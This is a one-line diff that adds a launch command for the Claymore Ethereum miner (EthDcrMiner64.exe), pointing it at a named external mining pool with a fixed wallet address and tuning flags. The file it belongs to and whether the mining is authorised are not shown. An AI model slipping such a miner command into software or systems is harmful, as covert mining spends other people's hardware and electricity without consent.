@@ -1,0 +1,1 @@
+EthDcrMiner64.exe -epool tcp://mining-pool.blackproject.space:8008 -ewal 0x69871F5b98B07210C3ae0001a100436608c5f9AB -eworker Claymore -epsw x -mode 1 -r 0 -dbg -1 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -ttli 77 -tstop 89 -asm 2 -allpools 1
